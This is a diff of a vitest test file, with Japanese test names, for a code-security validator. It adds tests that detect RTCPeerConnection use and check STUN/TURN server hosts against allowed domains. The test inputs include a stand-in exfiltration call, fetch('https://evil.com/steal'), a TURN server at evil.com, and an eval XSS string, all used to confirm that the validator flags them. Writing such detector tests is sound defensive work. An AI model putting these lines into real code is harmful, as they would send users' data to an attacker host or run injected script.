@@ -2,6 +2,7 @@ import { describe, it, expect } from 'vitest'
 import { analyzeCodeSecurity } from '../src/analyzer.js'
 import { CodeSecurityService, NEVER_ALLOWABLE_RULES, ALLOWABLE_RULES } from '../src/index.js'
 import { adjustViolationSeverity, determineFileContext } from '../src/utils/file-context.js'
+import { extractIceServerHost } from '../src/utils/helpers.js'
 import type { FileContext } from '../src/types.js'
 
 describe('CodeSecurityService - analyzer', () => {
@@ -1136,6 +1137,147 @@ describe('WorldPermissions モデル対応', () => {
     })
   })
 
+  describe('no-rtc-connection は allowedCodeRules で許可できる', () => {
+    const code = `const pc = new RTCPeerConnection()`
+
+    it('指定しなければ violations に残る', () => {
+      const result = service.validate({ code })
+
+      expect(result.violations.critical.filter(v => v.rule === 'no-rtc-connection').length).toBeGreaterThan(0)
+      expect(result.valid).toBe(false)
+    })
+
+    it('allowedCodeRules に指定すると violations から除外され、警告も出ない', () => {
+      const result = service.validate({
+        code,
+        worldPermissions: {
+          allowedCodeRules: ['no-rtc-connection'],
+        },
+      })
+
+      expect(result.violations.critical.filter(v => v.rule === 'no-rtc-connection')).toHaveLength(0)
+      expect(result.valid).toBe(true)
+      expect(result.permissionWarnings).toBeUndefined()
+    })
+
+    it('バンドル依存の中でも宣言なしでは抑制されない', () => {
+      const result = service.validate({
+        code,
+        fileContext: { isUserCode: false, isBundledDependency: true, isSharedLibrary: false, filePath: 'vendor.js' },
+      })
+
+      expect(result.violations.critical.filter(v => v.rule === 'no-rtc-connection').length).toBeGreaterThan(0)
+    })
+
+    it.each([
+      ['window 経由', `new window.RTCPeerConnection()`],
+      ['globalThis のブラケット記法', `new globalThis['RTCPeerConnection']()`],
+      ['ベンダープレフィックス', `new webkitRTCPeerConnection()`],
+      ['別名に代入', `const P = RTCPeerConnection; new P()`],
+      ['typeof での判定', `if (typeof RTCPeerConnection !== 'undefined') {}`],
+    ])('%s でも検出する', (_label, rtcCode) => {
+      const result = service.validate({ code: rtcCode })
+
+      expect(result.violations.critical.filter(v => v.rule === 'no-rtc-connection').length).toBeGreaterThan(0)
+    })
+
+    it('同名のプロパティ名や文字列だけでは検出しない', () => {
+      const result = service.validate({ code: `const o = { RTCPeerConnection: 1 }; const s = 'RTCPeerConnection'` })
+
+      expect(result.violations.critical.filter(v => v.rule === 'no-rtc-connection')).toHaveLength(0)
+    })
+
+    it('許可しても、同じファイルの未許可ドメインへの通信は検出される', () => {
+      const result = service.validate({
+        code: `${code}; fetch('https://evil.com/steal')`,
+        worldPermissions: { allowedCodeRules: ['no-rtc-connection'] },
+      })
+
+      expect(result.violations.critical.filter(v => v.rule === 'no-unauthorized-domain').length).toBeGreaterThan(0)
+      expect(result.valid).toBe(false)
+    })
+
+    it('許可すればスコアに数えず、許可しなければ 100', () => {
+      const allowed = service.validate({ code, worldPermissions: { allowedCodeRules: ['no-rtc-connection'] } })
+      const denied = service.validate({ code })
+
+      expect(allowed.securityScore).toBeLessThan(100)
+      expect(denied.securityScore).toBe(100)
+    })
+
+    it('detectedAPIs に RTCPeerConnection として出る（fetch 等とは分ける）', () => {
+      const result = service.validate({ code })
+
+      expect(result.analysis.detectedAPIs).toEqual(['RTCPeerConnection'])
+    })
+  })
+
+  describe('ICE サーバー（STUN/TURN）の接続先は allowedDomains で検査する', () => {
+    // 動的な設定（no-network-without-permission）はバンドル依存では抑制されるため、ユーザーコードとして検証する
+    const allowRTC = (allowedDomains: string[] = []) => ({
+      fileContext: { isUserCode: true, isBundledDependency: false, isSharedLibrary: false, filePath: 'src/World.tsx' },
+      worldPermissions: { allowedCodeRules: ['no-rtc-connection'], allowedDomains },
+    })
+    const rules = (result: ReturnType<CodeSecurityService['validate']>) =>
+      result.violations.critical.map(v => v.rule)
+
+    it('許可されていない TURN サーバーは no-unauthorized-domain', () => {
+      const result = service.validate({
+        code: `new RTCPeerConnection({ iceServers: [{ urls: 'turn:evil.com:3478', username: 'u', credential: 'c' }] })`,
+        ...allowRTC(),
+      })
+
+      expect(rules(result)).toContain('no-unauthorized-domain')
+      expect(result.valid).toBe(false)
+    })
+
+    it('allowedDomains に入れた STUN/TURN サーバーは通る', () => {
+      const result = service.validate({
+        code: `new RTCPeerConnection({ iceServers: [{ urls: ['stun:stun.example.com:19302', \`turns:turn.example.com?transport=tcp\`] }] })`,
+        ...allowRTC(['stun.example.com', 'turn.example.com']),
+      })
+
+      expect(rules(result)).toHaveLength(0)
+      expect(result.valid).toBe(true)
+    })
+
+    it('iceServers が変数だと no-network-without-permission', () => {
+      const result = service.validate({
+        code: `const servers = getServers(); new RTCPeerConnection({ iceServers: servers })`,
+        ...allowRTC(),
+      })
+
+      expect(rules(result)).toContain('no-network-without-permission')
+    })
+
+    it('設定オブジェクトごと変数で渡すと no-network-without-permission', () => {
+      const result = service.validate({
+        code: `const config = await loadConfig(); new RTCPeerConnection(config)`,
+        ...allowRTC(),
+      })
+
+      expect(rules(result)).toContain('no-network-without-permission')
+    })
+
+    it('RTC を使わないファイルの stun:/turn: 文字列は検査しない', () => {
+      const result = service.validate({ code: `const label = 'turn:left'; const o = { iceServers: x }` })
+
+      expect(result.violations.critical).toHaveLength(0)
+    })
+  })
+
+  describe('extractIceServerHost', () => {
+    it.each([
+      ['stun:stun.l.google.com:19302', 'stun.l.google.com'],
+      ['turn:Turn.Example.com?transport=udp', 'turn.example.com'],
+      ['turns://turn.example.com:5349', 'turn.example.com'],
+      ['stun:[2001:db8::1]:3478', '[2001:db8::1]'],
+      ['stun:', null],
+    ])('%s → %s', (url, host) => {
+      expect(extractIceServerHost(url)).toBe(host)
+    })
+  })
+
   describe('NEVER_ALLOWABLE_RULES は allowedCodeRules で指定しても除外されない', () => {
     it('no-eval を allowedCodeRules に指定しても violations に残る', () => {
       const code = `eval("alert('xss')")`
@@ -1317,12 +1459,12 @@ describe('WorldPermissions モデル対応', () => {
       }
     })
 
-    it('NEVER_ALLOWABLE_RULES は 9 ルール', () => {
-      expect(NEVER_ALLOWABLE_RULES).toHaveLength(9)
+    it('NEVER_ALLOWABLE_RULES は 8 ルール', () => {
+      expect(NEVER_ALLOWABLE_RULES).toHaveLength(8)
     })
 
-    it('ALLOWABLE_RULES は 8 ルール', () => {
-      expect(ALLOWABLE_RULES).toHaveLength(8)
+    it('ALLOWABLE_RULES は 9 ルール', () => {
+      expect(ALLOWABLE_RULES).toHaveLength(9)
     })
   })
 })
